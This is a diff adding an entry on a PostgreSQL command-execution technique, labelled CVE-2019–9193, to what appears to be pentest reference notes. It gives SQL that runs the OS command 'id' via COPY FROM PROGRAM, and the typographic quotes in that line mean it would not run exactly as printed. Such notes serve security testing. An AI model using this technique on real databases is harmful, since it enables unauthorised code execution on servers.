@@ -1,0 +1,19 @@
+=== Postgres
+
+==== Exploits
+
+===== CVE-2019–9193
+
+[cols=">1,3"]
+|===
+|Affects           |9.3 through 11.2
+|Type              |RCE
+|===
+
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM ‘id’;
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+```
